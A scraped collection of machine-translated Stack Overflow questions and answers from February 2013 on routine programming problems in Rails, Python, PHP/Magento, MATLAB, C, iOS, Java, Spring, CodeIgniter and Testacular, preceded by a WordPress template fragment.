      <div class="clear"></div>
      <br />
      <br />
      <!-- Feature -->
      <div class="grid_half"> 
        <?php get_template_part( 'features/feat', $features[2] ); //Get Features Section 3 ?>
      </div><!-- /.grid_half -->
<!-- Feature -->
      <div class="grid_half_last">
        <?php get_template_part( 'features/feat', $features[3] ); //Get Features Section 4 ?>
      </div><!-- /.grid_half_last -->
      <div class="clear"></div> 
```

为了获得完整信息，文件在名为 features 的子文件夹中命名为 feat-1.php、feat-2.php 等。

# ruby-on-rails - Rails 返回完整对象而不是整数

> ID：14916547
> 
> 赞同：0
> 
> 时间：2013-02-17T00:01:00.240
> 
> 标签：ruby-on-rails

Rails 的`pluralize`方法没有像我想要的那样工作（单词不是英文），所以我开始尝试自己的解决方案。我开始使用这种方法很简单`ApplicationController`：

```
def inflect(number, word)
  if number.to_i > 1
    word = word + "s"
  end      
  return "#{number} #{word}"
end 
```

在我看来，这样称呼它：

```
<% @articles.each do |article| %>
  <%= inflect(article.word_count, "word") %>
  <%= inflect(article.paragraph_count, "paragraph") %>
  ...
<% end %> 
```

但这让我：

```
undefined method `inflect' for #<#<Class:0x3ea79f8>:0x3b07498> 
```

当我认为它应该只是一个整数时，我发现它引用了一个成熟的对象很奇怪，所以我在控制台上对其进行了测试：

```
article = Article.first
=> (object hash)
article.word_count
=> 10
article.word_count.is_a?(Integer)
=> true 
```

所以我抛出了一个 quick `words = article.word_count.to_i`，但它并没有抛出 TypeError，它实际上什么也没做，并且仍然返回相同的错误：`undefined method ``inflect' for #<#<Class:0x3ea79f8>:0x3b07498>`引用该``inflect(article.word_count, "word")`行。

然后我想可能`inflect`已经是一个 Rails 方法并且它是某种命名冲突，但不管我将方法的名称更改为什么，它总是给我同样的错误：`undefined method ``whatever' for #<#<Class:0x3ea79f8>:0x3b07498>`

然后我在控制台上对其进行了测试，它运行良好。这是怎么回事？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-18T02:32:25.357

> Put your inflect method in ApplicationHelper, not ApplicationController

by default all code in your helpers are mixed into the views

the view is its own entity, it is not part of the controller, when a view instance gets created (automatically when your controller action executes) it gets passed any instance variables you define in your controller action, but does not have access to controller methods directly

NOTE: you can define methods in your controller to expose them to your views by using the `helper_method` macro - see this post for more info on that - [Controller helper_method](https://stackoverflow.com/questions/3549713/controller-helper-method)

but in general you would define the view helper methods in the helpers classes and not in the controller

# python - 将列表中的每个元素与所有其他元素进行比较

> ID：14916563
> 
> 赞同：3
> 
> 时间：2013-02-17T00:02:11.957
> 
> 标签：python

有没有办法将列表的所有元素（例如 [4, 3, 2, 1, 4, 3, 2, 1, 4]）与所有其他元素进行比较，并为每个元素返回其他元素的数量不同的元素（即，对于上面的列表 [6, 7, 7, 7, 6, 7, 7, 7, 6]）？然后我需要添加这个列表中的数字。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:08:31.830

```
li =  [4, 3, 2, 1, 4, 3, 2, 1, 4]

from collections import Counter

c = Counter(li)
print c
length = len(li)

print [length - c[el] for el in li] 
```

`c`在执行之前创建`[length - c[el] for el in li]`比对列表中的每个元素 i 执行更好`count(i)`，因为这意味着`count()`多次执行相同的计数（每次遇到给定元素时，它都会计数）

顺便说一下，另一种写法：

```
map(lambda x: length-c[x] , li) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T00:07:01.113

您可以使用方法获得类似的计数器`count()`。
并减去总数。
用理解列表在一行中完成。

```
>>> l = [4, 3, 2, 1, 4, 3, 2, 1, 4]
>>> [ len(l)-l.count(i) for i in l ]
[6, 7, 7, 7, 6, 7, 7, 7, 6] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-17T00:08:26.910

对于 Python 2.7：

```
test = [4, 3, 2, 1, 4, 3, 2, 1, 4]
length = len(test)
print [length - test.count(x) for x in test] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-17T00:21:59.847

您可以只使用该`sum`函数以及生成器表达式。

```
>>> l = [4, 3, 2, 1, 4, 3, 2, 1, 4]
>>> length = len(l)
>>> print sum(length - l.count(i) for i in l)
60 
```

生成器表达式的好处是您不会在内存中创建实际的列表，但类似的函数`sum`仍然可以迭代它们并产生所需的结果。但是请注意，一旦您对生成器进行了一次迭代，就不能再次对其进行迭代。

# php - Magento - 显示所有产品的总价

> ID：14916564
> 
> 赞同：0
> 
> 时间：2013-02-17T00:02:13.480
> 
> 标签：php, magento, sum

好的，我正在运行 Magento 1.7，我的老板要求我在网站顶部设置一个栏，显示库存商品的总数和所述库存的总价值。

到目前为止，我已经算出了项目部分的总数。我对 PHP 不是很好，所以经历了很多试验和错误。

这是我的代码到目前为止的样子[更新：有一个过滤器可以排除缺货产品]：

```
 <?php  
    $collection = Mage::getModel('catalog/product')->getCollection()
->joinField(
    'qty',
    'cataloginventory/stock_item',
    'qty',
    'product_id=entity_id',
    '{{table}}.stock_id=1',
    'left'
)
->addAttributeToFilter('qty', array('eq' <= 0));
    $_coreHelper = $this->helper('core');

    $sum = 0; 

        foreach ($collection as $product){ 
    $sum += $product->getPrice();
    }
?>

As of today our inventory consists of <span style="color: black; font-size:16px; font-family: Helvetica, sans-serif; font-weight: 400; border: 1px solid black; padding: 0px 2px 0px 2px;"><?php echo $collection->count(); ?></span> items with a total value of <span style="color: black; font-size:16px; font-family: Helvetica, sans-serif; font-weight: 400; border: 1px solid black; padding: 0px 2px 0px 2px;"><?php echo $_coreHelper->currency($sum); ?></span> 
```

总和部分显然不起作用。

谁能给我一些关于如何做到这一点的指示。我假设您将使用循环加载所有产品价格，然后将它们加在一起并显示总数，但正确到达那里对我来说是个问题。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T10:40:18.543

是的，你可以喜欢这样：

```
<?php $collection = Mage::getModel('catalog/product')->getCollection()->addAttributeToFilter('status','1');
$sum = 0;
$count = 0;
foreach ($collection as $_product) {
    $stock = Mage::getModel('cataloginventory/stock_item')->loadByProduct($_product)->getQty();
    if ($stock>=1) {
         $sum+=$_product->getPrice()*$stock;
         $count+=$stock;
    }
}
echo "You have $count items for a total value of ".Mage::helper('core')->currency($sum); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-27T14:37:00.227

我对上面 dagfr 的回答有一些问题，getPrice() 在管理仪表板上执行时未能返回任何值，

添加：

```
$collection->addAttributeToSelect('price'); 
```

然后允许我通过以下方式访问价格

```
$_product['price'] 
```

# php - 在全文搜索中替换名称，忽略标点符号并保持原样。PHP 和正则表达式

> ID：14916568
> 
> 赞同：1
> 
> 时间：2013-02-17T00:02:50.377
> 
> 标签：php, regex, preg-replace, punctuation

我正在尝试用链接替换文本文件中出现的某些字符串。一些实体由多个单词组成，即它们是中间有空格的字符串。我本质上是在寻找一个考虑到标点​​符号并且不区分大小写的正则表达式。我的“解决方案”似乎只是绕圈子，而我的正则表达式知识还不够好:(

```
$pattern = '/[ ._*&^%$#!?!]Anthony Anderson[ ._*&^%$#!?!]/i';

$replacement = '[[Tony Anderson]]';

$subject = 'Anthony anderson. (born August 15, 1970) is an actor, comedian, and writer. He has starred ... the ANTHony Anderson, as well as in Fox sitcom. anthony Anderson. Anthony aNderson? !Anthony AnderSon. Anthony    Anderson. . anthony
anderson. Anthony Andersoneon should not match neither should Santhony Anderson ';

echo preg_replace($pattern, $replacement, $subject, -1 ); 
```

让我这么远：

安东尼安德森。（生于 1970 年 8 月 15 日）是一名演员、喜剧演员和作家。他出演过……安东尼·安德森，以及福克斯情景喜剧。[[托尼·安德森]][[托尼·安德森]] [[托尼·安德森]]安东尼·安德森。. 安东尼·安德森。安东尼安德森不应该匹配，桑索尼安德森也不应该匹配

但我追求的是：

[[托尼·安德森]]。（生于 1970 年 8 月 15 日）是一名演员、喜剧演员和作家。他出演了……[[托尼·安德森]]，以及福克斯情景喜剧。[[托尼·安德森]]。[[托尼·安德森]]？![[托尼·安德森]]。[[托尼·安德森]]。. [[托尼·安德森]]。安东尼安德森不应该匹配，桑索尼安德森也不应该匹配

我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:05:29.673

我认为您想使用单词边界来匹配，`\b`. 这包括非单词字符，但也包括字符串的开头或结尾：

```
/\bAnthony Anderson\b/i 
```

# matlab - 如何为这个方程编写 matlab 脚本？

> ID：14916574
> 
> 赞同：-4
> 
> 时间：2013-02-17T00:03:58.770
> 
> 标签：matlab, equation

我有以下输出`matlab`：

```
 31.9374   31.9374   31.9374   27.9464   27.4044   31.4643   31.9374   22.5832
   31.9374   31.9374   31.9374   31.9374   31.9374   31.9374   31.9374   22.5832
   31.9374   31.9374   31.9374   31.9374   31.9374   31.9374   31.9374   22.5832
   31.9374   31.9374   31.9374   31.9374   31.9374   31.9374   31.9374   22.5832
   31.9374   31.9374   31.9374   31.9374   31.9374   31.9374   31.9374   22.5832
   31.9374   31.9374   31.9374   27.6586   27.6586   31.9374   31.9374   22.5832
   22.5832   22.5832   22.5832   15.9687   15.9687   22.5832   22.5832   15.9687 
```

对于该数据和显示的**每个**值，我想计算以下等式，该等式充当使值范围为的归一化，`0-255`因为我有其他数据类似于我也想计算的具有较大值的数据。

方程如下：

```
255 x (original value - 0) / (maximum value in matrix - minimum value in matrix) 
```

我该如何执行此操作`matlab`？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:12:32.700

如果您有矩阵中的数据`A`...

```
255 * A / (max(A(:)) - min(A(:))) 
```

# ipad - 样式化媒体查询在 Chrome iPad 上不起作用

> ID：14916575
> 
> 赞同：1
> 
> 时间：2013-02-17T00:04:01.457
> 
> 标签：ipad, google-chrome, css, media-queries

所以我添加了一些 javascript 来为我的身体添加一个类 -

```
var deviceAgent = navigator.userAgent.toLowerCase();
var agentID = deviceAgent.match(/(ipad)/);
if (agentID) {
    $("body").attr("id", "ipad");
    return;
} 
```

我有三个媒体查询，一个用于标准移动设备，一个用于视网膜，一些移动样式似乎显示在 iPad 上的 chrome 上，媒体查询如下

```
@media only screen and (max-device-width: 480px) { 
}

@media only screen and (max-device-width: 480px) and (-webkit-min-device-pixel-ratio: 2) {

} 
```

我的第三个媒体查询

```
/* iPads (portrait) ----------- */
@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and     (orientation : portrait) {
/* Styles */
} 
```

但是我在任一媒体查询中放置的所有样式在 ipad 上的 Chrome 中都没有效果，它在 iPad 上的 Safari 上完美运行。即使添加类的javascript似乎也不起作用，我已经添加了

```
#ipad body {background-color:red!important;} 
```

到媒体查询之外的主要css，什么也没有。

只是 chrome 不正常。我已经清除了缓存和浏览器数据，但仍然没有。

有任何想法吗？

# c# - 依赖注入到自动映射器解析器

> ID：14916576
> 
> 赞同：1
> 
> 时间：2013-02-17T00:04:05.353
> 
> 标签：c#, asp.net-mvc-4, dependency-injection, automapper, spring.net

我在我的 c# mvc4 应用程序中使用 AutoMapper。我使用它将我的 DTO 对象映射到我的视图模型。

我创建了一个自定义解析器来将 DTO 的特定属性解析为 Model 属性。

我也在使用 spring.net 依赖注入，我想知道是否可以直接注入到我的自定义解析器中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-18T12:52:15.503

您可以将其作为 AutoMapper 配置的一部分执行，如下所示：

```
Mapper.Initialize(cfg =>
{
    cfg.ConstructServicesUsing(ObjectFactory.GetInstance);
}); 
```

这个例子是针对 StructureMap 的，但是参数是这样的，`Func<Type, object>`所以我确信 Spring.net 中有一些东西可以做类似的工作。

# c - 指向结构和函数的指针

> ID：14916577
> 
> 赞同：0
> 
> 时间：2013-02-17T00:04:14.107
> 
> 标签：c, function, pointers, structure

我有一个简单的结构，称为条目定义，其中包含姓名和年龄。给定这些结构的数组，我想根据年龄对数组进行排序。

下面是我应用它的尝试，目前我什至无法编译它。我认为我的指针逻辑在 if 语句比较和随后的指针交换中都不正确。我尝试了各种方法来做同样的事情，但我没有得到任何地方。我对 C 很陌生，我仍在努力理解指针，所以这可能是我误解的基本内容。有人可以在下面解释我做错了什么吗？

任何帮助将不胜感激。

```
#include <stdio.h>

struct entry {
    char name[15];
    int age;
};

void entrySort( struct entry *dict);

void entrySort( struct entry *dict){
    int i,j;   // counters
    int ct = 4;
    struct entry *tmp;  // temporary holder

    for( i = 0; i < ct; i++){
        for( j = 0; j < ct; j++ ){
            if ((*dict[i].age) > (*dict[j].age)){
            tmp = (dict + i);
            (dict+i) = (dict+j);
            (dict+j) = tmp;

        }
    }
}

int main (void){
    int ct = 4, i;
    struct entry reg[4] =
       {{ "John", 24 },
        { "Alan", 18 },
        { "Jim", 40 },
        { "Sarah",32 }};

     entrySort(reg);

    for( i = 0; i < ct; i++)
        printf("name: %s. Age: %d\n", reg[i].name, reg[i].age);

   return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:15:32.403

您将对象数组`struct entry`作为指针传递：`struct entry *dict`，但您将其视为指向`struct entry`对象的指针数组：`(*dict[i]).age`。

`(dict+i)`仍然只是一个指向内存所在的指针`i+1`。元素被存储，即`&dict[i]`。要在 index 处实际访问此元素`i`，您需要使用[取消引用运算符](http://en.wikipedia.org/wiki/Dereference_operator)：`*(dict + i)`，它等于`dict[i]`.

还要注意，您在`i`和处交换元素`j`是错误的。“临时持有者”`tmp`应该是一个临时保存数据的对象，而不仅仅是一个指向内存的指针，您将要重写，因此将其声明为`struct entry tmp;`：

```
struct entry tmp;

for( i = 0; i < ct; i++) {
    for( j = 0; j < ct; j++ ) {
        if ((dict[i].age) > (dict[j].age)) {
            tmp = dict[i];
            dict[i] = dict[j];
            dict[j] = tmp;
        }
    }
} 
```

顺便说一句，在您发布的代码中，您的结尾大括号 ( `}`)`if`丢失了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-18T18:25:54.187

为了完整起见，以下是您的操作方法`qsort`：

```
#include <stdlib.h>
int sort_entry(const void *va, const void *vb) {
    const struct entry *a = va;
    const struct entry *b = vb;
    if(a->age < b->age) return -1;
    else if(a->age == b->age) return 0;
    return 1;
}

...

qsort(reg, ct, sizeof(struct entry), sort_entry); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-17T00:17:19.403

尝试：

```
#include <stdio.h>

struct entry {
    char name[15];
    int age;
};

void entrySort( struct entry *dict, int);

void entrySort( struct entry *dict, int ct){
    int i,j;   // counters
    /* int ct = 4; */
    struct entry tmp;  // temporary holder

    for( i = 0; i < ct; i++){
        for( j = 0; j < ct; j++ ){
            if ((dict[i].age) > (dict[j].age)){  /* no *  */
            tmp = *(dict + i);
            *(dict+i) = *(dict+j);
            *(dict+j) = tmp;

        }
    }
}

int main (void){
    int ct = 4, i;
    struct entry reg[4] =
       {{ "John", 24 },
        { "Alan", 18 },
        { "Jim", 40 },
        { "Sarah",32 }};

     entrySort(reg, ct);

    for( i = 0; i < ct; i++)
        printf("name: %s. Age: %d\n", reg[i].name, reg[i].age);

   return 0;
} 
```

# iphone - 触摸位置，框架。CGRectContainsPoint 不返回真

> ID：14916578
> 
> 赞同：0
> 
> 时间：2013-02-17T00:04:23.677
> 
> 标签：iphone, ios, uiimageview, uitouch, cgrect

我有多个 UIImageView 子类：

```
-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {

    for (UITouch *touch in touches) {

        CGPoint _location = [touch locationInView:touch.view];
        [self processTouch:_location];
    }

}

-(void)processTouch:(CGPoint)location {

    DLog(@"location: %f .. bounds: %f : %f" ,location.x, [twoThirdOfTheWayCoordinateX floatValue], [oneThirdOfTheWayCoordinateX floatValue]);

    if(CGRectContainsPoint(self.frame, location)) {

        DLog(@"1");

        if(location.x > [twoThirdOfTheWayCoordinateX floatValue]){

            [self oneStar];

        } else if (location.x < [oneThirdOfTheWayCoordinateX floatValue]) {

            [self zeroStars];

        } else if( [twoThirdOfTheWayCoordinateX floatValue] >= location.x && location.x >= [oneThirdOfTheWayCoordinateX floatValue]){

            [self halfStars];

        }

    }

} 
```

DLog(@"1"); 永远不会被调用。UIImageView 子类位于 iphone 屏幕的中间。当它位于左上角时，此代码有效。

NSLog：-[Star processTouch：] 位置：44.000000 .. 边界：33.333332：16.666666

我认为问题是因为：

```
if(CGRectContainsPoint(self.frame, location)) { 
```

永远不会被调用。

为什么呢？第一个 DLog 被调用。

我用来初始化实例的代码：

```
self.instance = [[Class alloc] initWithFrame:CGRectMake(10, 10, 50 , 50)];
self.instance.userInteractionEnabled = YES;
self.instance.image = [UIImage imageNamed:@"0-0.png"];
[self.view addSubview: self.instance];
[self.instance setNeedsDisplay]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:34:28.320

用 self.bounds 替换 self.frame 解决了这个问题。

感谢八月在 freenode 上的#iphonedev。

# java - Java：如何在不覆盖和写入新行的情况下写入文本文件

> ID：14916582
> 
> 赞同：0
> 
> 时间：2013-02-17T00:04:51.610
> 
> 标签：java, file

我查看了无数关于如何写入文件的论坛帖子和文章，但无济于事。我目前使用一个 FileWriter 声明：

```
 public FileWriter filewriter; 
```

然后用

```
 try {
      filewriter = new FileWriter(textfile, true);
   } catch (IOException e) {
      e.printStackTrace();
   } 
```

然后我写入文件：

```
 try {
      filewriter.write(string + "string");
      filewriter.flush();
   catch (IOException e) {
      e.printStackTrace();
   } 
```

那么我该如何做到这一点，以便我的作者不会覆盖当前文本，并且会在文本中添加新行。

例如（尝试以这些为例）：我想写如下

1.  去镇上
2.  然后右转
3.  然后进酒馆
4.  跟紫衣老人打招呼

那么我该如何完全从 Java 中编写。所有这些都是在不同的时间发起的，比如每当你点击一个按钮时，第一行就会写入，每当你再次点击它时，它就会写入第二行，依此类推。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T06:23:17.447

编写的代码是正确的。它在文件末尾写入数据并覆盖任何现有数据。

唯一*可能的*问题是，如果现有文件的最后一行没有以行终止符结尾，那么您在末尾写入的第一行额外数据将被附加到前最后一行的 and 之后。如果这是您关心的问题，那么简单的解决方法是从添加一个空行开始；例如`filewriter.write(newline);`，其中`newline`包含适当的行终止字符或字符。

（我还注意到，您的“编写代码”不包含明确的行终止符。它是字符串的一部分吗？这可能是您的问题吗？这些`Writer.write(...)`方法不会自动添加行终止符......）

# python - 从双字典python中提取值

> ID：14916590
> 
> 赞同：-1
> 
> 时间：2013-02-17T00:05:56.183
> 
> 标签：python

这可能是一个非常愚蠢的问题，但我想知道如何`RFC822.SIZE`从表单的双字典中提取值：

```
{1: {'RFC822.SIZE': 2515, 'SEQ': 1}, 
2: {'RFC822.SIZE': 2942, 'SEQ': 2}, .... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:12:18.517

```
your_dict = { 1:{'foo':123}}
your_dict[1]['foo'] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:12:39.957

```
In [2]: {1: {'RFC822.SIZE': 2515, 'SEQ': 1}, 2: {'RFC822.SIZE': 2942, 'SEQ': 2}}[1]['RFC822.SIZE']
Out[2]: 2515 
```

`{...}[1]`返回 sub-dictionary `{'RFC822.SIZE': 2515, 'SEQ': 1}`，您可以使用 从中获取值`['RFC822.SIZE']`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T00:15:19.673

“双字典”我想你的意思是*嵌套*字典，对吧？

好吧，当您通过键（例如，1）访问外部字典的值时，它将返回相应的内部字典，您可以访问哪些值......好吧，就像一个字典。

这是一个例子：

```
data = {1: {'RFC822.SIZE': 2515, 'SEQ': 1}, 2: {'RFC822.SIZE': 2942, 'SEQ': 2}}

# get the inner dictionary with key 1
key_1 = data[1] # {'RFC822.SIZE': 2515, 'SEQ': 1}

# get RFC822.SIZE
size = key_1['RFC822.SIZE'] 
```

知道了这一点，您可以通过直接访问该值来压缩所有代码：

```
size = data[1]['RFC822.SIZE'] 
```

这是一些基本的python（在python上编码时经常使用dicts）所以我建议（如果你打算在python上进行认真的编码）你阅读一些教程，至少你可以在[python的文档页面上找到介绍性的](http://docs.python.org/3/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-17T00:17:39.970

你有一个嵌套字典，所以使用嵌套查找：

```
for item in sizeList:
    print item, sizeList[item]['RFC822.SIZE'] 
```

请注意 this 与您评论中的用法之间的细微差别：您的评论尝试 index `item`，而 this 索引`sizeList[item]`.

# arrays - 在MATLAB中将不同大小的矩阵存储到数组中

> ID：14916593
> 
> 赞同：2
> 
> 时间：2013-02-17T00:06:05.200
> 
> 标签：arrays, matlab, matrix

我有 5 个不同维度的矩阵（n = 256、512、1024、2048 和 4096），我想知道如何将它们存储在一个数组中（稍后我可以在 for 循环中迭代）。我试着做 {\tt matArray = [ABCDE];} 但它说 horzcat 需要同意的尺寸。我也尝试过使用单元格，但我可能没有正确使用它们，因为我收到一条错误消息，上面写着“无法从双重单元格转换为单元格”。这是给我一个错误的代码：

```
A=randi(9, 256);
B=randi(9, 512);
C=randi(9, 1024);
D=randi(9, 2048);
E=randi(9, 4096);
matArray=cell(1,5);
matArray(1)=A;
matArray(2)=B;
matArray(3)=C;
matArray(4)=D;
matArray(5)=E; 
```

你们知道发生了什么吗？提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T00:09:19.370

采用`matArray{1}=A;`

这就是您处理单元格元素的方式。您可以稍后使用`matArray{1}`等来引用它。

你可以用一个简单的语句来初始化`matArray`所有的矩阵：

```
matArray = {A; B; C; D; E}; 
```

请注意使用*花括号*进行单元初始化。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-17T00:13:54.273

您需要分号来进行垂直连接。

```
matArray = [A; B; C; D; E]; 
```

# jboss - 任何参考支持 jboss 的 PaaS 的建议

> ID：14916608
> 
> 赞同：1
> 
> 时间：2013-02-17T00:09:33.190
> 
> 标签：jboss, paas

我正在评估`PaaS`替代方案。我的要求之一是支持`JBoss`. 除 外，任何建议`OpenShift`最好包括简单但技术上称职的安装说明。

提前致谢！罗德里戈

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-28T10:20:56.900

如果您正在寻找支持 JBoss 的 PaaS，[Cloudify](http://www.cloudifysource.org)，开源 PaaS 堆栈，有一个 JBoss 配方：[https ://github.com/CloudifySource/cloudify-recipes/tree/master/services/jboss](https://github.com/CloudifySource/cloudify-recipes/tree/master/services/jboss)

免责声明：我是 Cloudify 的开发人员之一。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-25T20:11:32.177

OpenShift（来自 Red Hat - JBoss 人）支持 EAP6.1、AS7，即将发布 wildfly，以及平台上的所有数据库。

警告 - 我是 OpenShift 的传播者

# spring - 在 Spring MVC 3.1 中使用继承

> ID：14916610
> 
> 赞同：3
> 
> 时间：2013-02-17T00:09:41.083
> 
> 标签：spring, spring-mvc

研究Spring MVC中继承的使用。

拥有一个其他控制器可以扩展的基本控制器是个好主意吗？

基本控制器将保留所有控制器共有的功能。例如，获取登录用户的句柄等。

如果使用基本控制器不是一个好主意，是否还有其他建议可以实现我上面提到的内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T10:43:28.047

拥有一个其他控制器可以扩展的基本控制器是完全可以接受的。当 Spring 引入 @Controller 注解时，它们为您使用所需的任何类层次结构铺平了道路。

请注意，作为面向对象的设计原则，优先考虑组合而不是继承。根据经验（不是硬性规定），我建议将您的通用控制器代码移动到一个类中，该类的接口可以通过[@Inject 或 @Autowired](http://static.springsource.org/spring/docs/3.2.1.RELEASE/spring-framework-reference/html/beans.html#beans-standard-annotations)注入到您的控制器中。

获得登录用户句柄的另一个建议是多做一些工作，但一旦你有了它就很好了。请参阅此处有关在控制器方法参数上使用[当前用户注释](https://stackoverflow.com/questions/8764545/best-practice-for-getting-active-users-userdetails)的讨论。这就是我在我的项目中所做的，效果很好！

# database - Codeigniter URI 不工作 - 404 错误

> ID：14916614
> 
> 赞同：-1
> 
> 时间：2013-02-17T00:09:54.230
> 
> 标签：database, codeigniter, uri

我已经四处寻找示例，但我得到了一个奇怪的结果

我希望有以下发生 /pages/1 URL 从数据库返回页表的第 1 行的标记列。

控制器

```
    公共函数索引（）
        {
            $id = $this->uri->segment(2);
            $content = $this->page->specificMarkup($id);
            $this->template->set('nav', 'support');
            $this->template->set('content', $content);
            $this->template->load('master', 'contact');
        }

```

模型

```
    公共功能特定标记（$id）

        {
        $query = $this->db->get_where('pages', $id);
        $row = $query->row();
        返回$行->标记；
        }

```

它在我专门设置 $id 时有效，但现在当我尝试使用段时返回 404 错误，用户指南给我的印象是这应该有效。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:30:45.477

我将为遇到此问题的其他人回答我自己的问题。

1.

该模型需要是

```
public function specificMarkup($id)

    {
    $query = $this->db->get_where('pages', array('id' => $id));
    $row = $query->row();
    return $row->markup;
    } 
```

2\. 他们确实需要是 routes.php 中的一个条目

$route[ 'pages/(:num)' ] = 'pages/index/$1'

这让codeigniter知道将流量引导到哪里

# php - 从所有先前的消息和元数据中提取电子邮件消息本身（Sendgrid Parse API/PHP）？

> ID：14916618
> 
> 赞同：7
> 
> 时间：2013-02-17T00:10:16.967
> 
> 标签：php, regex, parsing, email, sendgrid

我正在使用[Sendgrid 和他们的 Parse API](http://sendgrid.com/docs/API_Reference/Webhooks/parse.html)来发送/接收电子邮件。Parse API 允许一个 Web 应用程序以 $_POST 的形式接收电子邮件，但问题是在 $_POST 中，我希望能够从其先前的消息和链接在一起的元数据中提取消息本身。

为了向您展示我在下图中的意思，我只想捕获文本，**“尝试从 GMAIL 从 12373 发送到 12373”**，而不是它下面的所有垃圾。如果这不可能，是否有人对如何解析电子邮件正文（`$_POST['text']`）有任何建议，以便我可以分离出邮件本身？

问题是，取决于电子邮件客户端（gmail、outlook 等），我不清楚日期信息，在这种情况下：“2013 年 1 月 23 日，星期三 ...”，将允许关注消息本身。如果所有电子邮件客户端都将日期放在消息下方，那么我似乎可以设计一个花哨的正则表达式来查找换行符，然后是日期或其他内容。想法？

![**整个** 包含先前消息的消息正文](../Images/79191efc37866e14257d45370a6ad831.png)

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-02-17T00:42:00.793

你有几个选择：

**1）插入一个拆分电子邮件的令牌**

您可以执行类似的操作`--- reply above this line ---`，然后删除该令牌下方的所有内容。

**2）使用电子邮件回复解析库**

[github 做了](https://github.com/github/email_reply_parser)一个非常好的工作，但它是用 ruby​​ 编写的。有一个[php 端口](https://github.com/willdurand/EmailReplyParser)，虽然这可能对你需要的有好处：

**完整的工作代码**：

```
<?php
  require_once 'application/third_party/EmailReplyParser-master/src/autoload.php';
  $email = new \EmailReplyParser\Email();
  $reply = $email->read($_POST['text']);            
  $message=$reply[0]->getContent();
  $message=preg_replace('~On(.*?)wrote:(.*?)$~si', '', $message); 
  //Last line is needed for some email clients, e.g., some university e-mails: foo@bar.edu but not Gmail or Hotmail, to get rid of "On Jan 23...wrote:" 
  //This failure to remove "On Jan 23...wrote:" is a known issue and is documented in their README

 ?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T01:04:07.553

根本无法保证从电子邮件中解析引用的消息线程，因此您不会找到适用于所有情况的正则表达式或任何其他代码。没有标准来定义回复的格式，并且您已经观察到不同的邮件客户端使用不同的约定。事实上，许多将允许用户编辑引用的文本。此外，用户可以粘贴不相关的消息，无论是否带有标题，从而形成混合匹配的格式。

如果您可以记录并保留所有消息的发送和接收历史记录，那么您可以（通常但不总是）使用 In-Reply-To 标头（请参阅[RFC-5322](https://www.rfc-editor.org/rfc/rfc5322)）通过匹配上一条消息来定位它Message-ID 标头，并对正文进行比较并删除重复的文本运行。很明显，一些电子邮件系统这样做是为了改进他们的演示文稿，但我不知道有任何可用的开源代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-05-11T11:43:10.680

用英语以外的其他语言回复呢？我们提出了添加标记的解决方案，但不是为每封电子邮件翻译它（基于用户的语言），我们将一些不可见的字符放入其中（`U+200B`准确地说是零宽度空间）。基于 "On..." 正则表达式，它容易出错，它可以轻松剪切一些电子邮件内容。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-05-13T08:48:47.360

// 剪切引用文本，[https://regex101.com/r/xO8nI1/5](https://regex101.com/r/xO8nI1/5)

```
 $message = preg_replace('/(On\s.*<\n){0,1}(.*\n(\n){0,1}((^>+\s?.*$)+\n?)+)/mi', '', $message); 
```

# javascript - 睾丸错误：无法启动 chrome

> ID：14916619
> 
> 赞同：0
> 
> 时间：2013-02-17T00:10:26.443
> 
> 标签：javascript, jasmine, karma-runner

我正在阅读 AngularJS 教程，我被困在运行 Testacular 测试的教程上。我收到以下错误：

```
Starting Testacular Server (http://vojtajina.github.com/testacular)
-------------------------------------------------------------------
info: Testacular server started at http://localhost:9876/
info (launcher): Starting browser Chrome
error (launcher): Cannot start Chrome
    execvp(): No such file or directory

info (launcher): Trying to start Chrome again.
error (launcher): Cannot start Chrome
    execvp(): No such file or directory

info (launcher): Trying to start Chrome again.
error (launcher): Cannot start Chrome
    execvp(): No such file or directory 
```

当我搜索问题时，有类似的用户遇到此问题，但他们使用的是 Windows。我正在使用 Linux Mint。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T08:54:11.717

It is just a small problem in config files' list of browsers. You should change the name of the browser in the configuration files under config/ directory: config/testacular.conf.js and testacular-e2e.conf.js. If you are using chromium browser set the list of browsers to 'chromium-browse', instead of 'Chrome' like this.:

```
browsers = ['chromium-browser']; 
```

Here is an ss of my testacular.conf.js file: ![an ss of my testacular.conf.js](../Images/c5a25e3c732f24abfa2e380449257bdc.png).

If you would like to include more than one browser for you tests you can add the name of the other browsers installed in your system:

```
browsers = ['chromium-browser', 'firefox']; 
```

